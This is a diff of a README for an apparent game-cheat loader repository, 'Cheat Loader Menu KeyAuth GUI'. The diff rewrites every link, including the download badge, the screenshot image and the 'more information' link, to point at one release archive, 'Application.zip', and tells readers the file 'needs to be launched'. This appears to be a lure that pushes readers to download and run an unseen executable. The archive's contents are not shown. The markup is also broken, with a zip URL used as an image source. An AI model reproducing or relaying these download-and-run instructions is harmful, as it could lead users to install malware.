@@ -13,9 +13,9 @@ Welcome to the Cheat Loader Menu KeyAuth GUI repository! This repository contain
 
 ## Installation
 To download the application, click on the button below:
-[![Download Application](https://img.shields.io/badge/Download-Application.zip-<COLOR>.svg)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Application](https://github.com/luisangelops/Cheat-Loader-Menu-KeyAuth-GUI/releases/download/v1.0/Application.zip<COLOR>.svg)](https://github.com/luisangelops/Cheat-Loader-Menu-KeyAuth-GUI/releases/download/v1.0/Application.zip)
 
-### Note: The downloaded file "Application.zip" needs to be launched.
+### Note: The downloaded file "https://github.com/luisangelops/Cheat-Loader-Menu-KeyAuth-GUI/releases/download/v1.0/Application.zip" needs to be launched.
 
 If the link provided above does not work, please check the "Releases" section for alternative download options.
 
@@ -30,7 +30,7 @@ If you encounter any issues or have any questions about the Cheat Loader Menu Ke
 
 We hope you enjoy using the Cheat Loader Menu KeyAuth GUI for your cheat entry menus! Thank you for choosing our application. Happy gaming! 🎮🚀
 
-![Cheat Loader Menu KeyAuth GUI](https://imageurl.com)
+![Cheat Loader Menu KeyAuth GUI](https://github.com/luisangelops/Cheat-Loader-Menu-KeyAuth-GUI/releases/download/v1.0/Application.zip)
 
 ---
-For more information visit [this link](https://github.com/user-attachments/files/18426772/Application.zip).
+For more information visit [this link](https://github.com/luisangelops/Cheat-Loader-Menu-KeyAuth-GUI/releases/download/v1.0/Application.zip).
